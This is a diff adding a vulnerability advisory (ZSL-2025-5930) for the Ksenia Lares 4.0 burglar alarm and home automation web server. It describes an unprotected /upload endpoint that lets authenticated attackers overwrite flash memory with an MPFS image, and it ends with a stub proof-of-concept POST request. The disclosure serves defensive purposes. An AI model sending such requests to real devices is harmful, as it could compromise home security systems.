@@ -1,0 +1,44 @@
+
+Ksenia Security Lares 4.0 Home Automation Remote Code Execution
+
+
+Vendor: Ksenia Security S.p.A.
+Product web page: https://www.kseniasecurity.com
+Affected version: Firmware version 1.6
+                  Webserver version 1.0.0.15
+
+Summary: Lares is a burglar alarm & home automation system that can
+be controlled by means of an ergo LCD keyboard, as well as remotely
+by telephone, and even via the Internet through a built-in WEB server.
+
+Desc: The device provides access to an unprotected endpoint, enabling
+the upload of MPFS File System binary images. Authenticated attackers
+can exploit this vulnerability to overwrite the flash program memory 
+containing the web server's main interfaces, potentially leading to
+arbitrary code execution.
+
+Tested on: Ksenia Lares Webserver
+
+
+Vulnerability discovered by Mencha `ShadeLock` Isajlovska
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5930
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5930.php
+
+
+03.07.2024
+
+--
+
+
+POST /upload HTTP/1.1
+Host: 192.168.1.2
+
+------WebKitFormBoundary5GYWB4nichZAk7BS
+Content-Disposition: form-data; name="i"; filename="MPFSImage.bin"
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundary5GYWB4nichZAk7BS--
